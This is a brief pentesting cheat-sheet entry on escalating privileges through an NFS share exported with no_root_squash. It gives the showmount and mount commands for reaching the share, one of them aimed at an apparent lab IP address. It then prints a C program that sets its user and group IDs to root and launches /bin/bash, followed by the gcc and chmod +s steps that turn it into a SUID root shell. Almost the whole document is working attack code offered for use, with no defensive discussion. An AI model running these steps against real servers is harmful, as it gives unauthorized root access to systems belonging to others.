# NFS no_root_squash
---------
If no root squash option is set on the nfs server, we can upload a file as root user and it will be stored with the root user permissions on the victim system.

```bash
showmount -e $IP
```

```bash
mount -t nfs $IP:/tmp/ /mnt/tmp -o nolock
```

```bash
mount -t nfs -o vers=3 "10.10.179.144:/tmp" "/mnt/tmp/"
```

```C
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main(){
	setuid(0);
	setgid(0);
	system("/bin/bash");
	return 0;
}
```

```bash
gcc shell.c -o shell
```

```bash
chmod +s shell 
```